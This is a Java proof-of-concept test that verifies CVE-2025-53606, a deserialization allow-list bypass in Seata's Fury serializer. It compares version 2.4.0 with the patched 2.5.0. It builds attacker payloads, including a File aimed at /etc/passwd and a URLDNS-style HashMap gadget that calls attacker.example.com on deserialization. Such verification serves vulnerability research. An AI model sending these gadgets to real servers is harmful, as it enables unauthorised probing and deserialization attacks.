import org.apache.fury.Fury;
import org.apache.fury.config.CompatibleMode;
import org.apache.fury.config.Language;
import org.apache.fury.resolver.AllowListChecker;

import java.io.File;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Set;

/**
 * CVE-2025-53606: Direct ClassChecker Bypass Verification
 *
 * Models the real attack: attacker serializes with their own Fury (no checker),
 * then the server deserializes with the broken lambda ClassChecker.
 *
 * Proves:
 * 1. VULNERABLE: Broken lambda ClassChecker returns false but doesn't throw → bypass
 * 2. FIXED: AllowListChecker throws InsecureException → blocked
 *
 * The key insight: Fury's ClassResolver.loadClass() (deserialization path) IGNORES
 * the boolean return value of ClassChecker.checkClass(). It only stops if an
 * exception is thrown. The broken lambda never throws, so ALL classes pass.
 *
 * Run:
 *   javac -cp '/seata-server/libs/*' ClassCheckerBypassTest.java
 *   java -cp '.:/seata-server/libs/*' ClassCheckerBypassTest
 */
public class ClassCheckerBypassTest {

    // Seata whitelist (from SerializerSecurityRegistry.getAllowClassPattern())
    private static final Set<String> ALLOW_LIST = new HashSet<String>() {{
        add("java.lang.String");
        add("java.lang.Integer");
        add("java.lang.Long");
        add("java.lang.Boolean");
        add("org.apache.seata.*");
    }};

    /**
     * Create an "attacker" Fury instance — no class restrictions.
     * This is what an attacker would use to generate payloads.
     */
    private static Fury createAttackerFury() {
        return Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
    }

    /**
     * Create a "vulnerable server" Fury — broken lambda ClassChecker (Seata 2.4.0).
     * The lambda returns boolean but Fury's loadClass() ignores the return value.
     */
    private static Fury createVulnerableServerFury() {
        Fury f = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
        // VULNERABLE: Exact pattern from FurySerializerFactory.java line 42
        // Returns boolean but never throws — Fury's loadClass() ignores the return
        f.getClassResolver().setClassChecker(
                (classResolver, className) ->
                        ALLOW_LIST.contains(className)
        );
        return f;
    }

    /**
     * Create a "patched server" Fury — AllowListChecker with STRICT mode (Seata 2.5.0).
     * Properly throws InsecureException for non-allowed classes.
     */
    private static Fury createPatchedServerFury() {
        Fury f = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .withRefTracking(true)
                .withCompatibleMode(CompatibleMode.COMPATIBLE)
                .build();
        // FIXED: AllowListChecker throws InsecureException for non-allowed classes
        AllowListChecker checker = new AllowListChecker(AllowListChecker.CheckLevel.STRICT);
        f.getClassResolver().setClassChecker(checker);
        checker.allowClasses(ALLOW_LIST);
        return f;
    }

    /**
     * Test: Attacker generates payload → server deserializes
     *
     * Vulnerable server: ClassChecker returns false but doesn't throw → BYPASS
     * Patched server: AllowListChecker throws InsecureException → BLOCKED
     */
    static void testDeserializationBypass() {
        System.out.println("╔══════════════════════════════════════════════════════════╗");
        System.out.println("║  CVE-2025-53606: ClassChecker Bypass Verification       ║");
        System.out.println("╚══════════════════════════════════════════════════════════╝\n");

        // --- STEP 1: Generate payloads with attacker's Fury (no restrictions) ---
        System.out.println("=== STEP 1: Attacker generates Fury-serialized payloads ===");
        Fury attackerFury = createAttackerFury();

        byte[][] payloads = new byte[3][];
        String[] classNames = {"java.io.File", "java.util.concurrent.atomic.AtomicInteger", "HashMap<URL,String>"};
        Object[] objects = new Object[3];

        try {
            objects[0] = new File("/etc/passwd");
            payloads[0] = attackerFury.serialize(objects[0]);
            System.out.println("  [+] Serialized java.io.File: " + payloads[0].length + " bytes");
        } catch (Exception e) {
            System.out.println("  [-] Failed to serialize File: " + e.getMessage());
        }

        try {
            objects[1] = new java.util.concurrent.atomic.AtomicInteger(42);
            payloads[1] = attackerFury.serialize(objects[1]);
            System.out.println("  [+] Serialized AtomicInteger: " + payloads[1].length + " bytes");
        } catch (Exception e) {
            System.out.println("  [-] Failed to serialize AtomicInteger: " + e.getMessage());
        }

        try {
            URL url = new URL("http://attacker.example.com/cve-2025-53606");
            HashMap<URL, String> map = new HashMap<>();
            map.put(url, "exploit");
            Field hf = URL.class.getDeclaredField("hashCode");
            hf.setAccessible(true);
            hf.set(url, -1);  // Force hashCode recalculation on deserialization
            objects[2] = map;
            payloads[2] = attackerFury.serialize(map);
            System.out.println("  [+] Serialized HashMap<URL,String>: " + payloads[2].length + " bytes");
        } catch (Exception e) {
            System.out.println("  [-] Failed to serialize URL HashMap: " + e.getMessage());
        }

        // --- STEP 2: Test deserialization on VULNERABLE server ---
        System.out.println("\n=== STEP 2: Deserialize on VULNERABLE server (Seata 2.4.0) ===");
        System.out.println("  ClassChecker: lambda returns boolean (BROKEN — no exception thrown)");
        Fury vulnFury = createVulnerableServerFury();

        int vulnBypassCount = 0;
        for (int i = 0; i < payloads.length; i++) {
            if (payloads[i] == null) continue;
            System.out.println("\n  Testing: " + classNames[i] + " (in allow list: " + isInAllowList(classNames[i]) + ")");
            try {
                Object result = vulnFury.deserialize(payloads[i]);
                System.out.println("  Deserialized: " + result);
                System.out.println("  Result type:  " + result.getClass().getName());
                System.out.println("  >>> BYPASSED! Non-whitelisted class deserialized without exception <<<");
                vulnBypassCount++;

                // Extra check for URL DNS gadget
                if (result instanceof HashMap) {
                    HashMap<?, ?> m = (HashMap<?, ?>) result;
                    for (Object key : m.keySet()) {
                        if (key instanceof URL) {
                            System.out.println("  URL key: " + key);
                            Field hf = URL.class.getDeclaredField("hashCode");
                            hf.setAccessible(true);
                            int hc = (int) hf.get(key);
                            System.out.println("  URL.hashCode: " + hc + " (non-(-1) = hashCode() was called = DNS triggered)");
                        }
                    }
                }
            } catch (Exception e) {
                System.out.println("  BLOCKED: " + getRootCauseType(e) + ": " + getRootMessage(e));
            }
        }

        // --- STEP 3: Test deserialization on PATCHED server ---
        System.out.println("\n=== STEP 3: Deserialize on PATCHED server (Seata 2.5.0) ===");
        System.out.println("  ClassChecker: AllowListChecker(STRICT) — throws InsecureException");
        Fury patchedFury = createPatchedServerFury();

        int patchedBlockCount = 0;
        for (int i = 0; i < payloads.length; i++) {
            if (payloads[i] == null) continue;
            System.out.println("\n  Testing: " + classNames[i] + " (in allow list: " + isInAllowList(classNames[i]) + ")");
            try {
                Object result = patchedFury.deserialize(payloads[i]);
                System.out.println("  Deserialized: " + result);
                System.out.println("  >>> NOT BLOCKED (class may be in allow list or built-in) <<<");
            } catch (Exception e) {
                String causeType = getRootCauseType(e);
                System.out.println("  BLOCKED: " + causeType + ": " + getRootMessage(e));
                if (causeType.contains("InsecureException")) {
                    System.out.println("  >>> AllowListChecker properly rejected non-whitelisted class <<<");
                    patchedBlockCount++;
                }
            }
        }

        // --- SUMMARY ---
        System.out.println("\n═══════════════════════════════════════════════════════════");
        System.out.println("RESULTS:");
        System.out.println("  Vulnerable (broken lambda): " + vulnBypassCount + " classes bypassed whitelist");
        System.out.println("  Patched (AllowListChecker):  " + patchedBlockCount + " classes properly blocked");
        System.out.println();
        if (vulnBypassCount > 0 && patchedBlockCount > 0) {
            System.out.println("  VERDICT: CVE-2025-53606 CONFIRMED");
            System.out.println("  The lambda ClassChecker's boolean return is ignored by Fury.");
            System.out.println("  AllowListChecker's InsecureException properly blocks classes.");
        } else if (vulnBypassCount > 0) {
            System.out.println("  VERDICT: CVE-2025-53606 CONFIRMED (bypass works)");
        } else {
            System.out.println("  VERDICT: Could not confirm bypass");
        }
        System.out.println("═══════════════════════════════════════════════════════════");
    }

    private static boolean isInAllowList(String className) {
        return ALLOW_LIST.contains(className);
    }

    private static String getRootCauseType(Throwable t) {
        Throwable root = t;
        while (root.getCause() != null) root = root.getCause();
        return root.getClass().getSimpleName();
    }

    private static String getRootMessage(Throwable t) {
        Throwable root = t;
        while (root.getCause() != null) root = root.getCause();
        String msg = root.getMessage();
        if (msg != null && msg.length() > 100) msg = msg.substring(0, 100) + "...";
        return msg;
    }

    public static void main(String[] args) {
        testDeserializationBypass();
    }
}
